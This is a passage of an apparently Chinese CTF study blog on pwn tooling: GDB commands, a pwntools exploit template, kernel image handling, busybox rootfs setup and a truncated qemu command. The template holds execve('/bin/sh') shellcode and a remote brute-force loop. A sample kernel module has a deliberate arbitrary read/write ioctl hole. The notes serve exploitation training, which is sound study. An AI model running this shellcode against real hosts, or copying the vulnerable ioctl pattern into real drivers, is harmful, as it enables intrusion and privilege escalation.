title="LD_LIBRARY_PATH"></a>LD_LIBRARY_PATH</h2><p>  类似于前面的<strong>runtime path</strong>，但是优先级次一级。即程序运行前，在查找动态链接库时，会首先在指定的<strong>rpath</strong>路径下查找；然后在指定的<strong>LD_LIBRARY_PATH</strong>路径下查找；最后在系统的默认路径下进行查找</p><p>  其命令执行形式如下所示<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LD_LIBRARY_PATH=[path] [execute]</span><br></pre></td></tr></table></figure></p><h1 id="GDB调试器"><a href="#GDB调试器" class="headerlink" title="GDB调试器"></a>GDB调试器</h1><p>  再做<em>PWN</em>题目的时候，需要进行相关的调试，这就需要Linux中的<strong>GDB</strong>进行辅助。</p><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p>  <strong>GDB</strong>及其插件中提供了大量的操作，方便进行调试程序，在<a href="http://www.gnu.org/software/gdb/documentation/">GDB教程资源</a>和<a href="https://browserpwndbg.readthedocs.io/en/docs/commands/misc/pwndbg/">pwndbg教程</a>中有详细的信息，这里简单介绍几个</p><ol><li><code>starti</code>，该命令将程序执行到真正的入口处，并停止等待后续<strong>DEBUG</strong>命令</li><li><code>call [function]</code>，直接调用<code>function</code>函数执行</li><li><code>break [address] if [condition]</code>，即当条件<code>condition</code>满足时，程序会在执行到<code>address</code>时停止</li><li><code>break *$rebase(address)</code>，即在装载基地址偏移<code>address</code>设立断点</li><li><code>dprintf *$rebase(address) &quot;%d\n&quot;, $rax</code>，即当执行到<code>*$rebase(address)</code>地址处，输出相关的格式信息</li><li><code>find [/SIZE-CHAR] START-ADDRESS, END-ADDRESS, EXPR1</code>，即在指定范围内寻找指定值和类型的数据，其中，<strong>SIZE-CHAR</strong>可选<em>b</em>、<em>h</em>、<em>w</em>、<em>g</em>，分别表示8bit、16bit、32bit和64bit</li><li><code>p *(struct s*)(address)</code>，即将<em>address</em>地址处的变量当作<strong>struct s</strong>结构体的指针，并打印出具体的结构体信息</li><li><code>![command]</code>，即在gdb中打开<strong>shell</strong>，执行<em>command</em>指令</li></ol><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>  除了手动一条一条命令的进行交互，也可以通过命令行，按照提前给定的指令依次执行，如下所示<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb [file] -ex [command1] -ex [command2] ...</span><br></pre></td></tr></table></figure><br>  之后，gdb加载给定的目标程序，并按照参数顺序，依次在<strong>GDB</strong>中执行参数中传递的命令</p><h1 id="pwntools库"><a href="#pwntools库" class="headerlink" title="pwntools库"></a>pwntools库</h1><p>  这是专门用于CTF和漏洞利用的Python库</p><h2 id="PWN模板"><a href="#PWN模板" class="headerlink" title="PWN模板"></a>PWN模板</h2><p>  为了方便<em>PWN</em>，这里专门给出一个标准脚本，可以稍加修改即可用于任何不同的<em>PWN</em>题目<br>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">待修改数据</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span><span class="comment"># 32位使用i386</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line">execve_file = <span class="literal">None</span></span><br><span class="line">lib_file = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">使用lambda函数包装pwntools的API，从而使与用户交互的都是str即可</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">ENCODING = <span class="string">&#x27;ISO-8859-1&#x27;</span></span><br><span class="line">se= <span class="keyword">lambda</span> senddata: r.send(senddata.encode(ENCODING))</span><br><span class="line">sa= <span class="keyword">lambda</span> recvdata, senddata, timeout=<span class="number">0x3f3f3f3f</span>: r.sendafter(recvdata.encode(ENCODING), senddata.encode(ENCODING), timeout=timeout)</span><br><span class="line">sl= <span class="keyword">lambda</span> senddata: r.sendline(senddata.encode(ENCODING))</span><br><span class="line">sla= <span class="keyword">lambda</span> recvdata, senddata, timeout=<span class="number">0x3f3f3f3f</span>: r.sendlineafter(recvdata.encode(ENCODING), senddata.encode(ENCODING), timeout=timeout)</span><br><span class="line">re= <span class="keyword">lambda</span> numb=<span class="number">0x3f3f3f3f</span>, timeout=<span class="number">0x3f3f3f3f</span>: (r.recv(numb, timeout=timeout).decode(ENCODING))</span><br><span class="line">ru= <span class="keyword">lambda</span> recvdata, timeout=<span class="number">0x3f3f3f3f</span>: (r.recvuntil(recvdata.encode(ENCODING), timeout=timeout).decode(ENCODING))</span><br><span class="line">uu32= <span class="keyword">lambda</span> data: u32((data.ljust(<span class="number">4</span>, <span class="string">&#x27;\x00&#x27;</span>)).encode(ENCODING), signed=<span class="string">&quot;unsigned&quot;</span>)</span><br><span class="line">uu64= <span class="keyword">lambda</span> data: u64((data.ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)).encode(ENCODING), signed=<span class="string">&quot;unsigned&quot;</span>)</span><br><span class="line">iu32= <span class="keyword">lambda</span> data: u32((data.ljust(<span class="number">4</span>, <span class="string">&#x27;\x00&#x27;</span>)).encode(ENCODING), signed=<span class="string">&quot;signed&quot;</span>)</span><br><span class="line">iu64= <span class="keyword">lambda</span> data: u64((data.ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)).encode(ENCODING), signed=<span class="string">&quot;signed&quot;</span>)</span><br><span class="line">up32= <span class="keyword">lambda</span> data: (p32(data, signed=<span class="string">&quot;unsigned&quot;</span>).decode(ENCODING))</span><br><span class="line">up64= <span class="keyword">lambda</span> data: (p64(data, signed=<span class="string">&quot;unsigned&quot;</span>).decode(ENCODING))</span><br><span class="line">ip32= <span class="keyword">lambda</span> data: (p32(data, signed=<span class="string">&quot;signed&quot;</span>).decode(ENCODING))</span><br><span class="line">ip64= <span class="keyword">lambda</span> data: (p64(data, signed=<span class="string">&quot;signed&quot;</span>).decode(ENCODING))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">elf.plt[`symbol`] 获取elf文件中导入符号的plt地址</span></span><br><span class="line"><span class="string">elf.got[`symbol`] 获取elf文件中导入符号的got地址</span></span><br><span class="line"><span class="string">elf.sym[&#x27;symbol&#x27;] 获取elf文件中本地符号的函数实际地址</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> execve_file != <span class="literal">None</span>:</span><br><span class="line">elf = ELF(execve_file)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">lib.sym[`symbol`] 获取lib中符号地址</span></span><br><span class="line"><span class="string">next(lib.search(&#x27;string&#x27;)) 获取lib中字符串地址</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> lib_file != <span class="literal">None</span>:</span><br><span class="line">lib = ELF(lib_file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">执行爆破攻击</span></span><br><span class="line"><span class="string">只有当成功获取shell或者键盘Ctrl+C退出时，程序中止循环</span></span><br><span class="line"><span class="string">否则程序一直进行循环</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line"><span class="keyword">global</span> r</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;d&#x27;</span> <span class="keyword">in</span> sys.argv:</span><br><span class="line">r = process(execve_file)</span><br><span class="line">gdb.attach(r)<span class="comment"># 断点必须在第一个输入之后</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">r = remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">这里给出asm 汇编-&gt;机器代码的相关样例</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> context.arch == <span class="string">&#x27;amd64&#x27;</span>:</span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">movrax, %d/*rbx = &quot;/bin/sh&quot;*/</span></span><br><span class="line"><span class="string">pushrax</span></span><br><span class="line"><span class="string">movrdi, rsp/*rdi -&gt; &quot;/bin/sh&quot;*/</span></span><br><span class="line"><span class="string">xoresi, esi/*esi -&gt; NULL*/</span></span><br><span class="line"><span class="string">xoredx, edx/*edx -&gt; NULL*/</span></span><br><span class="line"><span class="string">push0x3b</span></span><br><span class="line"><span class="string">poprax/*rax = 0x3b*/</span></span><br><span class="line"><span class="string">syscall/*execve(&quot;/bin/sh&quot;)*/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">label1:</span></span><br><span class="line"><span class="string">movrax, [rsp + %d]/* 测试内存访问 */</span></span><br><span class="line"><span class="string">cmprax, 1</span></span><br><span class="line"><span class="string">jelabel1/* 测试近跳*/</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>%(uu64(<span class="string">&#x27;/bin/sh&#x27;</span>), <span class="number">8</span>)).decode(ENCODING)</span><br><span class="line"><span class="keyword">elif</span> context.arch == <span class="string">&#x27;i386&#x27;</span>:</span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push%d/*&quot;/bin&quot;*/</span></span><br><span class="line"><span class="string">push%d/*&quot;/sh\x00&quot;*/</span></span><br><span class="line"><span class="string">movebx, esp/*ebx -&gt; &quot;/bin/sh&quot;*/</span></span><br><span class="line"><span class="string">xorecx, ecx/*ecx -&gt; NULL*/</span></span><br><span class="line"><span class="string">xoredx, edx/*edx -&gt; NULL*/</span></span><br><span class="line"><span class="string">push11</span></span><br><span class="line"><span class="string">popeax/*eax = 11*/</span></span><br><span class="line"><span class="string">int 0x80/*execve(&quot;/bin/sh&quot;)*/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">label1:</span></span><br><span class="line"><span class="string">moveax, [esp + %d]/* 测试内存访问 */</span></span><br><span class="line"><span class="string">cmpeax, 1</span></span><br><span class="line"><span class="string">jelabel1/* 测试近跳*/</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>%(uu32(<span class="string">&#x27;/sh&#x27;</span>), uu32(<span class="string">&#x27;/bin&#x27;</span>), <span class="number">4</span>)).decode(ENCODING)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">exp()</span><br><span class="line">sl(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">data = ru(<span class="string">&#x27;&#125;&#x27;</span>, <span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;&#123;&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">r.close()</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">log.info(data)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br></pre></td></tr></table></figure></p><h1 id="Kernel"><a href="#Kernel" class="headerlink" title="Kernel"></a>Kernel</h1><p>  kernel pwn中涉及非常琐碎的知识点，这里简单介绍一些</p><h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2><h3 id="内核文件"><a href="#内核文件" class="headerlink" title="内核文件"></a>内核文件</h3><p>  一般有如下几种内核文件格式</p><ol><li><strong>vmlinux</strong><br>从源码编译出来的，原始内核二进制文件</li><li><strong>bzImage</strong><br>big zImage，也就是更大的zImage。而<strong>zImage</strong>是<strong>vmlinux</strong>经过压缩后的文件，使用<a href="extract-vmlinux">extract-vmlinux脚本</a>将<strong>zImage</strong>解压为<strong>vmlinux</strong><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./extract-vmlinux /path/to/bzImage &gt; /path/to/vmlinux</span><br></pre></td></tr></table></figure>亦可使用<a href="https://github.com/marin-m/vmlinux-to-elf">vmlinux-to-elf</a>，将<strong>bzImage</strong>转换为带符号的<strong>vmlinux</strong><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmlinux-to-elf /path/to/bzImage /path/to/vmlinux</span><br></pre></td></tr></table></figure></li></ol><h3 id="镜像文件"><a href="#镜像文件" class="headerlink" title="镜像文件"></a>镜像文件</h3><p>  即文件系统镜像——简单来说，该文件中保存着一个文件系统的<strong>dump</strong>。只要将该文件映射入内存，即建立了根文件系统所需要的结构信息</p><p>  一般名称为<strong>rootfs.cpio</strong><br>  使用如下命令将其文件结构导出到当前目录中<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cpio -D <span class="variable">$&#123;dir&#125;</span> -idv &lt; /path/to/rootfs.cpio</span><br></pre></td></tr></table></figure></p><p>  如果想将<strong>${dir}</strong>的目录数据和结构作为内核的根目录，使用如下命令打包成文件系统镜像<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">cd</span> <span class="variable">$&#123;dir&#125;</span>; find . | cpio -o --format=newc &gt; /path/to/rootfs.cpio)</span><br></pre></td></tr></table></figure></p><h2 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h2><p>  在编写kernel pwn的exploit时，有时需要某个结构体的字段偏移。<br>  往往有两种方式</p><ol><li>根据源码手算结构体的偏移。这种方式虽然简单，但是十分容易出错</li><li>编写一个模块，其内容就是计算结构体偏移</li></ol><p>对于第二种方式，(默认要计算的结构体在内核不同版本间无变化，否则要先编译对应版本的内核)这里给出编写驱动所需要的<strong>Makefile</strong>、<strong>编译脚本</strong>和<strong>驱动源代码</strong>，可以参照<a href="https://docs.kernel.org/kbuild/makefiles.html#loadable-module-goals-obj-m">官方参考链接1</a>和<a href="https://docs.kernel.org/kbuild/modules.html">官方参考链接2</a></p><p><strong>Makefile</strong>如下所示<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">obj-m+= hawk.o</span><br><span class="line"></span><br><span class="line"><span class="section">all:</span></span><br><span class="line">make -C /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">make -C /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build M=<span class="variable">$(PWD)</span> clean</span><br></pre></td></tr></table></figure></p><p>  在<strong>Makefile</strong>同目录下执行如下命令<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make<span class="comment">#编译驱动</span></span><br><span class="line">make clean<span class="comment">#清除编译</span></span><br></pre></td></tr></table></figure></p><p>  <strong>驱动源代码</strong>样例如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/uaccess.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/miscdevice.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/random.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VULN_WRITE0x1737</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VULN_READ0x1738</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">vuln_open</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *filp)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">vuln_unlocked_ioctl</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">vuln_fops</span> =</span> &#123;</span><br><span class="line">open : vuln_open,</span><br><span class="line">unlocked_ioctl : vuln_unlocked_ioctl,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">miscdevice</span> <span class="title">vuln_miscdev</span> =</span> &#123;</span><br><span class="line">    .minor      = <span class="number">11</span>,</span><br><span class="line">    .name       = <span class="string">&quot;vuln&quot;</span>,</span><br><span class="line">    .fops       = &amp;vuln_fops,</span><br><span class="line">    .mode    = <span class="number">0666</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">vuln_open</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *filp)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> *addr;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> val;</span><br><span class="line">&#125; Data;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">vuln_unlocked_ioctl</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span>&#123;</span><br><span class="line"></span><br><span class="line">Data data;</span><br><span class="line"><span class="built_in">memset</span>(&amp;data, <span class="number">0</span>, <span class="keyword">sizeof</span>(data));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (cmd)&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> VULN_WRITE:</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(copy_from_user(&amp;data, (Data *)arg, <span class="keyword">sizeof</span>(data)) != <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">*(data.addr) = data.val;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> VULN_READ:</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(copy_from_user(&amp;data, (Data *)arg, <span class="keyword">sizeof</span>(data)) != <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(copy_to_user((<span class="type">void</span>*)data.val, data.addr, <span class="keyword">sizeof</span>(data.val)) != <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> -ENOTTY;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">vuln_init</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> misc_register(&amp;vuln_miscdev);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">vuln_exit</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line"> misc_deregister(&amp;vuln_miscdev);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(vuln_init);</span><br><span class="line">module_exit(vuln_exit);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><h2 id="busybox"><a href="#busybox" class="headerlink" title="busybox"></a>busybox</h2><p>前面简单介绍过，<strong>Linux</strong>内核的启动过程，需要根文件系统映像。一般使用<a href="https://busybox.net/">busybox</a></p><p>其中，通过<code>make menuconfig</code>以静态链接方式编译，再通过<code>make</code>和<code>make install</code>命令，即可在<strong>${busybox}/_install</strong>目录中，构建一个基础的根文件系统。</p><p>再通过前面相关内容，即可通过<strong>cpio</strong>命令，生成根文件系统映像</p><h3 id="创建挂载目录"><a href="#创建挂载目录" class="headerlink" title="创建挂载目录"></a>创建挂载目录</h3><p>执行下述命令，创建内核的伪文件系统的挂载点<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> dev etc proc sys</span><br></pre></td></tr></table></figure></p><h3 id="etc-inittab"><a href="#etc-inittab" class="headerlink" title="/etc/inittab"></a>/etc/inittab</h3><p>根据<a href="https://elixir.bootlin.com/busybox/latest/source/init/init.c">init/init.c</a>可知，<strong>/linuxrc</strong>会解析/etc/inittab文件，并完成相关的脚本执行。模板配置如下所示<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">::sysinit:/etc/init.d/rcS</span><br><span class="line">::respawn:-/bin/sh</span><br><span class="line">::restart:/sbin/init</span><br></pre></td></tr></table></figure></p><h3 id="etc-init-d-rcS"><a href="#etc-init-d-rcS" class="headerlink" title="/etc/init.d/rcS"></a>/etc/init.d/rcS</h3><p>根据上面的<strong>/etc/inittab</strong>脚本的内容，其会执行<strong>/etc/init.d/rcS</strong>脚本，初始化内核配置。模板配置如下所示<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line"><span class="built_in">echo</span> /sbin/mdev &gt; /proc/sys/kernel/hotplug</span><br><span class="line">mdev -s</span><br></pre></td></tr></table></figure></p><p>创建该文件后，还需要设置权限为可执行，即执行<code>chmod +x /etc/init.d/rcS</code>即可</p><h2 id="qemu"><a href="#qemu" class="headerlink" title="qemu"></a>qemu</h2><p>  为了方便调试，一般通过<strong>qemu</strong>模拟运行内核，运行命令如下所示<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line"> -kernel <span class="variable">$&#123;linux&#125;</span>/arch/x86_64/boot/bzImage \</span><br><span class="line"> -initrd /path/to/rootfs.cpio \</span><br><span class="line"> -monitor /dev/null \</span><br><span class="line"> -serial mon:stdio \</span><br><span class="line"> -nographic \</span><br><span class="line"> -append <span 